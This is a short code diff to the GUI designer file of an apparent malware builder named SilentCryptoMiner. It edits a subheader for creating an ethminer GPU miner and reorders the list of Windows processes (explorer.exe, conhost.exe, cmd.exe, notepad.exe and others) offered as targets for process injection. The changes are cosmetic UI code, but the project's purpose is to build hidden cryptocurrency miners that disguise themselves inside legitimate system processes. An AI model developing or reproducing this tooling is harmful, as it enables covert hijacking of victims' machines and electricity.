@@ -112,7 +112,7 @@ namespace SilentCryptoMiner
             this.formMinerETH.MinimumSize = new System.Drawing.Size(535, 272);
             this.formMinerETH.Name = "formMinerETH";
             this.formMinerETH.Size = new System.Drawing.Size(535, 272);
-            this.formMinerETH.SubHeader = "Create a new miner (ethminer)";
+            this.formMinerETH.SubHeader = "Create a new miner (ethminer - GPU)";
             this.formMinerETH.TabIndex = 0;
             this.formMinerETH.Text = "Create New Miner";
             // 
@@ -527,8 +527,8 @@ namespace SilentCryptoMiner
             this.comboInjection.ItemHeight = 16;
             this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
             this.comboInjection.Items.AddRange(new object[] {
-            "explorer.exe",
             "conhost.exe",
+            "explorer.exe",
             "nslookup.exe",
             "cmd.exe",
             "notepad.exe",
